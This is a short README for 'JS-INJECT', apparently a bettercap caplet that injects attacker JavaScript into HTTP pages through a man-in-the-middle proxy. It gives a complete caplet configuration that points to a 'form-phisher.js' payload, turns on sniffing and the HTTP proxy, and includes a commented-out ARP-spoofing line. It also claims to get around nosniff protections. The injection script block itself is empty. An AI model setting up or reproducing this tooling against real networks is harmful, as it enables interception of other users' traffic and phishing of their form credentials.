### JS-INJECT

A simple yet powerful proxy module that lets you inject your JavaScript payloads into any HTTP web page/application.

It prevents re-initiation of your script when it's already active in the DOM by declaring your payload as a unique function variable, and it ignores the `X-Content-Type-Options: nosniff` header by checking for both file extensions and `Content-Type` headers.

All you have to do is set your payload path in the caplet file.

**caplets/jsinject/jsinject.cap**

```sh
# Set the path to your JavaScript payload
set jsinject.payload caplets/jsinject/payloads/form-phisher.js

set http.proxy.script caplets/jsinject/jsinject.js
set net.sniff.verbose false
net.sniff on
http.proxy on
#arp.spoof on
```

**caplets/jsinject/jsinject.js**

```javascript
```
